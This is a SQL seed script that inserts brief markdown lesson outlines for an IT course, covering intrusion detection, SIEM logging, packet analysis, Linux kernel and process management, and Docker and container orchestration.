INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'c5f841ba-1cbc-4bc1-b796-fb446a705264', 'Intrusion Detection Systems', 1,
'## IDS/IPS

### Types:
- NIDS (network), HIDS (host), NIPS (network prevention)

### Tools:
- Snort (signature-based rules)
- Suricata (modern, multi-threaded)

### Rule Types:
- Signature-based pattern matching
- Anomaly-based baseline deviation
- Stateful protocol analysis', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Intrusion Detection Systems');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'c5f841ba-1cbc-4bc1-b796-fb446a705264', 'Log Management and SIEM', 2,
'## Log Management and SIEM

### Centralized Logging:
- rsyslog for remote log collection
- Forward to SIEM platform

### ELK Stack:
- Elasticsearch, Logstash, Kibana
- Docker Compose deployment

### Key Log Sources:
- Auth logs, firewall logs, web access/error logs
- Application logs, system logs, DB query logs

### Alerting:
- Multiple failed logins
- Connections to known C2 servers
- Unusual data transfers', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Log Management and SIEM');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'c5f841ba-1cbc-4bc1-b796-fb446a705264', 'Network Traffic Analysis', 3,
'## Network Traffic Analysis

### Wireshark:
- Capture filters and display filters
- Follow TCP streams
- Export objects

### tcpdump:
- Packet capture to pcap
- Protocol-specific filters

### Attack Signatures:
- Beaconing patterns
- DNS tunneling
- Data exfiltration
- Port scanning', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'c5f841ba-1cbc-4bc1-b796-fb446a705264' AND title = 'Network Traffic Analysis');

-- Networking: Section 4
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b', 'Network Troubleshooting Methodology', 1,
'## Troubleshooting

### CompTIA Process:
1. Identify the problem
2. Establish theory of cause
3. Test the theory
4. Plan and implement fix
5. Verify and document

### Quick Commands:
- ping, traceroute, mtr for connectivity
- dig, nslookup for DNS
- ip addr show, ethtool for interfaces
- ss -tulnp for listening ports', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Network Troubleshooting Methodology');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b', 'Packet Analysis and Forensics', 2,
'## Packet Analysis

### Wireshark Investigation:
- Follow TCP streams for full conversations
- IO graphs for traffic patterns
- Protocol-specific filters

### PCAP Investigation:
1. Open in Wireshark
2. Apply display filters
3. Follow streams and extract payloads
4. Timeline analysis

### Indicators of Compromise:
- Unusual DNS queries (DGA domains)
- HTTP User-Agent anomalies
- TLS certificate mismatches', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Packet Analysis and Forensics');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b', 'Performance Monitoring Tools', 3,
'## Performance Monitoring

### System Monitoring:
- top, htop, glances, nmon

### Network Monitoring:
- iftop, nethogs, nload, vnstat

### Connection Analysis:
- ss -tulnp, netstat -anp, lsof -i

### Bandwidth Testing:
- iperf3 for internal bandwidth
- speedtest-cli for internet speed

### Disk I/O:
- iostat, iotop, df -h', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cbcbf26e-21a1-4f4e-9016-23cc5c49029b' AND title = 'Performance Monitoring Tools');

-- Linux Kernel: Section 1
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '9854d730-e12f-4d09-a17a-b1f94a2b7c7d', 'Kernel Architecture', 1,
'## Kernel Architecture

### Kernel Types:
- Monolithic (Linux) - All services in kernel space
- Microkernel (QNX) - Minimal kernel
- Hybrid (Windows NT, macOS)

### Components:
- Process scheduler, Memory manager
- Virtual File System, Network stack
- Device drivers, IPC

### Kernel Space vs User Space:
- System calls interface between modes

### Modules:
- lsmod, modinfo, modprobe, rmmod', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Kernel Architecture');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '9854d730-e12f-4d09-a17a-b1f94a2b7c7d', 'Process Management', 2,
'## Process Management

### Process States:
R (Running), S (Sleeping), D (Disk sleep), T (Stopped), Z (Zombie)

### Commands:
- ps aux, top, kill, killall
- nice/renice for priority

### Signals:
- SIGTERM (15) graceful, SIGKILL (9) force
- SIGHUP (1) terminal hangup', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Process Management');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '9854d730-e12f-4d09-a17a-b1f94a2b7c7d', 'Memory Management', 3,
'## Memory Management

### Virtual Memory:
- Per-process address space
- Page tables, TLB

### Commands:
- free -h, /proc/meminfo, vmstat, slabtop

### Swap:
- Create swap file, tune swappiness
- OOM Killer for memory pressure

### Page Cache:
- File data in memory
- Dirty pages and sync', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '9854d730-e12f-4d09-a17a-b1f94a2b7c7d' AND title = 'Memory Management');

-- Linux Kernel: Section 2
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'cd761025-bbfb-4135-bcf2-5be718c5cc31', 'Performance Profiling', 1,
'## Performance Profiling

### Tools:
- perf (CPU profiling)
- strace (system calls)
- ltrace (library calls)
- Flame graphs

### Common Bottlenecks:
- CPU bound: high %usr
- I/O bound: high %wa
- Memory: page faults, swap
- Network: packet drops', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Performance Profiling');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'cd761025-bbfb-4135-bcf2-5be718c5cc31', 'Kernel Tuning Parameters', 2,
'## Kernel Tuning

### sysctl:
- View: sysctl -a
- Set: sysctl -w param=value
- Persistent: /etc/sysctl.conf

### Network Tuning:
- tcp_fin_timeout, tcp_tw_reuse
- somaxconn, netdev_max_backlog
- TCP buffer sizes (rmem/wmem)

### File System:
- fs.file-max, fs.nr_open
- inotify.max_user_watches', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Kernel Tuning Parameters');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'cd761025-bbfb-4135-bcf2-5be718c5cc31', 'Resource Limits and cgroups', 3,
'## Resource Limits

### ulimit:
- ulimit -a to view limits
- /etc/security/limits.conf

### cgroups v2:
- Create control groups
- Set memory and CPU limits
- Move processes to cgroups

### Docker Resource Limits:
- cpus and memory limits
- Memory reservations
- systemd-cgtop for monitoring', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'cd761025-bbfb-4135-bcf2-5be718c5cc31' AND title = 'Resource Limits and cgroups');

-- Containerization: Section 1
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372', 'Docker Fundamentals', 1,
'## Docker Fundamentals

### Concepts:
- Image (read-only template), Container (running instance)
- Dockerfile (build blueprint), Registry (image storage)

### Best Practices:
- Use alpine base, npm ci --production
- USER node, EXPOSE port

### Commands:
- docker build, run, ps, logs, exec, stop, rm, rmi', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Docker Fundamentals');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372', 'Image Building and Optimization', 2,
'## Image Optimization

### Multi-stage Builds:
- Builder stage for compilation
- Production stage with only runtime deps

### Layer Optimization:
- Combine RUN commands
- Order by change frequency
- Use .dockerignore

### Security:
- Don't run as root
- Scan for vulnerabilities
- Use specific tag versions', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Image Building and Optimization');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372', 'Docker Networking', 3,
'## Docker Networking

### Network Types:
- bridge (default), host, overlay, none, macvlan

### DNS Resolution:
- Containers resolve by container name

### Port Mapping:
- -p host:container
- -P for all published ports

### Security:
- --internal for isolated networks
- Custom bridges for better isolation', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = 'fd1cc0bd-6cb3-41e5-b71e-771731e2e372' AND title = 'Docker Networking');

-- Docker Compose: Section 2
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5', 'Docker Compose Fundamentals', 1,
'## Docker Compose

### Structure:
- version, services, volumes, networks

### Commands:
- docker compose up -d, down, ps
- docker compose logs -f
- docker compose exec service bash
- docker compose build, pull, restart

### Features:
- Health checks with condition
- Volume mounts for persistence
- Environment variable files (.env)', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Docker Compose Fundamentals');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5', 'Multi-Service Architecture', 2,
'## Multi-Service Architecture

### Typical Stack:
- nginx (reverse proxy)
- frontend (React/Next.js)
- api (Node.js/NestJS)
- db (PostgreSQL)
- redis (caching)

### Service Dependencies:
- depends_on with health check conditions

### Shared Networks:
- Frontend net vs backend net
- Services spanning multiple networks', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Multi-Service Architecture');

INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5', 'Production Deployment', 3,
'## Production Deployment

### Checklist:
- Health checks, resource limits, logging
- Secrets management, SSL/TLS
- Backup strategy, monitoring

### Secrets:
- Docker secrets or .env files (never commit)

### Backup:
- pg_dump for databases
- Volume backup with alpine tar', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '7d69a72c-6db7-41f6-b8d8-34ab66a5b6f5' AND title = 'Production Deployment');

-- Orchestration: Section 3
INSERT INTO "Lesson" (id, "sectionId", title, "order", content, "createdAt", "updatedAt")
SELECT gen_random_uuid(), '61a08aeb-28b8-41f8-9c8d-169511f8a50c', 'Container Orchestration Concepts', 1,
'## Container Orchestration

### Why Orchestration:
- Automated deployment and scaling
- Self-healing (restart failed containers)
- Load balancing, rolling updates
- Service discovery

### Kubernetes Architecture:
- Control Plane: API server, scheduler, etcd
- Nodes: Worker machines
- Pod: Smallest deployable unit
- Service: Stable network endpoint
- Deployment: Manages pod replicas

### Docker Swarm (Simpler):
- docker swarm init
- docker stack deploy
- docker service ls/scale', NOW(), NOW()
WHERE NOT EXISTS (SELECT 1 FROM "Lesson" WHERE "sectionId" = '61a08aeb-28b8-41f8-9c8d-169511f8a50c' AND title = 'Container Orchestration Concepts');
